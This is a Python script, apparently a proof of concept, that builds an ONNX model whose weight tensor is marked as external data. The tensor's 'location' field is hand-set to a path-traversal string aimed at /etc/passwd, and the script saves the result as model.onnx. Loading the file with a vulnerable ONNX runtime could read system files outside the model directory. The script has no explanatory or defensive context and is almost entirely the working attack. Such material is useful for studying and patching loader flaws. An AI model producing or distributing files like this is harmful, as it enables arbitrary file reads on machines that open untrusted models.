import os
import onnx
import numpy as np
from onnx import helper, TensorProto
from onnx import save_model
from onnx.external_data_helper import convert_model_to_external_data

# Ensure external data location exists
os.makedirs("./testSpace", exist_ok=True)

# ==== STEP 1: Create a weight tensor with NO inline data ====
W_data = np.array([[1.0, 2.0], [3.0, 4.0]], dtype=np.float32)

# Manually create a TensorProto without embedding data
W_tensor = helper.make_tensor(
    name="W",
    data_type=TensorProto.FLOAT,
    dims=list(W_data.shape),
    vals=W_data.flatten().tolist()
)

# Clear raw/inline data
W_tensor.ClearField("raw_data")
W_tensor.ClearField("float_data")

# Mark the tensor's data location as external
W_tensor.data_location = TensorProto.DataLocation.EXTERNAL

# Manually construct the external_data field
entry = onnx.StringStringEntryProto()
entry.key = "location"
entry.value = "../../../../../../etc/passwd"
W_tensor.external_data.append(entry)

# with open("./workspace/../readme.txt", "wb") as f:
#     f.write(W_data.tobytes())

# ==== STEP 2: Build ONNX graph using this tensor ====
input_tensor = helper.make_tensor_value_info("X", TensorProto.FLOAT, [2, 2])
output_tensor = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [2, 2])

node = helper.make_node(
    "Add",
    inputs=["X", "W"],
    outputs=["Y"]
)

graph = helper.make_graph(
    [node],
    "ExternalWeightGraph",
    inputs=[input_tensor],
    outputs=[output_tensor],
    initializer=[W_tensor]
)

# Specify opset version 15
opset = helper.make_operatorsetid("", 15)

model = helper.make_model(
    graph,
    opset_imports=[opset],
    producer_name="manual-external-tensor"
)

# ==== STEP 3: Save the model ====
model_path = "model.onnx"
model.ir_version=8
onnx.save(model, model_path)

print(f"Model saved to '{model_path}'")
